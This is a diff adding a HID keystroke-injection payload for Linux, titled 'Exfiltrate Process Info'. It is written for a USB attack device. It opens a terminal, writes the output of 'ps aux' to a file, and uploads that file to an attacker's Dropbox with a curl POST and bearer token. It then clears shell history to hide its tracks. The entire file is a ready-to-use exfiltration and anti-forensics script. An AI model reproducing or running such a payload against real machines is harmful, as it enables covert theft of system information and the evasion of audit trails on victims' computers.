@@ -1,0 +1,52 @@
+##########################################
+#                                        #
+# Title        : Exfiltrate Process Info #
+# Author       : Aleff                   #
+# Version      : 1.0                     #
+# Category     : Exfiltration            #
+# Target       : Linux                   #
+#                                        #
+##########################################
+
+ATTACKMODE HID
+
+# Requirements:
+#     - Internet Connection
+#     - Dropbox Token
+
+# VARIABLES
+# Set here your Dropbox access TOKEN
+DROPBOX_ACCESS_TOKEN='example'
+# Set yout Dropbox folder name
+DROPBOX_FOLDER_NAME='example'
+# This is a const, don't edit it
+DROPBOX_API_CONST='https://content.dropboxapi.com/2/files/upload'
+
+QUACK DELAY 1000
+QUACK CTRL-ALT t
+QUACK DELAY 2000
+
+#### GET PROCESS SECTION ####
+QUACK STRING ps aux > process.txt
+QUACK ENTER
+QUACK DELAY 500
+
+#### EXFILTRATE SECTION ####
+QUACK STRING USER_NAME=\$(whoami)
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING TXT_PATH=\"/home/\$USER_NAME/process.txt\"
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING curl -X POST $DROPBOX_API_CONST --header \"Authorization: Bearer $DROPBOX_ACCESS_TOKEN\" --header \"Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER_NAME\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}\" --header \"Content-Type: application/octet-stream\" --data-binary \"@\$TXT_PATH\"
+QUACK ENTER
+
+# It depends by the internet connection, btw 1 or 2 seconds, generally, is sufficient
+QUACK DELAY 2000
+
+#### REMOVE TRACES ####
+QUACK STRING history -c
+QUACK ENTER
+QUACK DELAY 500
+QUACK STRING exit
+QUACK ENTER
